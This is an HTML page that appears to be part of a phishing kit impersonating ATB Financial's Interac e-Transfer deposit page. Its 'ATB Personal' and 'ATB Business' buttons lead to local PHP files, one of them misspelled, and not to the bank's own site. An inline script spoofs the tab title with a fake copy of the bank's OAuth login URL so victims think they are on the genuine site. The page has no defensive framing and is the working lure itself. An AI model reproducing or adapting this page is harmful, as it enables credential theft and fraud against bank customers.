

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Interac e-Transfer – ATB Financial</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" crossorigin="anonymous">
    <link href="/Static/etransfer/css/index.css" rel="stylesheet">
    <link rel="icon" type="image/x-icon" href="/Static/img/favicon.ico">
    <link rel="Shortcut Icon" href="/static/img/favicon.ico" type="image/x-icon">
    <link rel="apple-touch-icon" href="/Static/img/apple-touch-icon-57x57.png">
    <link rel="apple-touch-icon" sizes="76x76" href="/Static/img/apple-touch-icon-76x76.png">
    <link rel="apple-touch-icon" sizes="120x120" href="/Static/img/apple-touch-icon-120x120.png">
    <link rel="apple-touch-icon" sizes="152x152" href="/Static/img/apple-touch-icon-152x152.png">
    <link rel="apple-touch-icon" sizes="167x167" href="/Static/img/apple-touch-icon-167x167.png">
    <link rel="apple-touch-icon" sizes="180x180" href="/Static/img/apple-touch-icon-180x180.png">
</head>
<body page-type="etransfer">
<header class="container">
    <div class="row">
        <div class="col-lg-12 logo">
            <br><br>
            <img src="https://etransfer.atb.com/siteassets/atb-logo.png" class="simpleImage" alt="ATB eTransfer site" aria-label="ATB eTransfer site">
            <br><br><br>
        </div>
    </div>
</header>
<div class="container-fluid">
    <div class="row well middle-container">
        <div class="col-lg-12">
            <div class="container">
                <div class="row">
                    <div id="controls" class="col-lg-12 text-center">
                        <h3><strong>Deposit this&nbsp;<em>Interac<sup>®</sup>&nbsp;</em>e-Transfer by logging in to:</strong></h3>
                        <br>
                        <div id="errorMessage" class="error"></div>
                        <div class="btn-group" role="group">
                            <a href="atb.personal.php" id="lnkAtbPersonal" class="btn btn-primary" style="margin-right: 10px;">ATB Personal</a>
                            <button id="onlineBusinessBtn" type="button" class="btn btn-primary" onclick="window.location.href='atb.buisness.php'">ATB Business</button>
                        </div>
                        <br><br><br><br>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
<div class="container">
    <div class="row">
        <div class="col-lg-12">
            <h4><b>Need Help?</b></h4>
            Call ATB Client Care at 1-800-332-8383 7am-11pm
        </div>
    </div>
</div>
<script>
// Replace all <title> tags and document.title
(function(customTitle){
    document.title = customTitle;
    // Replace any <title> elements in <head>
    const titles = document.getElementsByTagName('title');
    for(let t of titles){ t.textContent = customTitle; }
})("login.atb.com/as/authorization.oauth2?redirect_uri=https%3A%2F%2Fpersonal.atb.com%2Fcallback&client_id=ATBWEB&response_type=code&state=svCf1Lg88e&scope=openid%20profile%20retail-web&cmid=c5784e341edd48ff8b31859a9a0c6a82&response_mode=fragment&appState=%5Bobject%20Object%5D&code_challenge=wWaag2OMe666BN8rjSsaPMohU3qbPdrFY5Y_JxY6Cw8&code_challenge_method=S256");
</script></body>
</html>
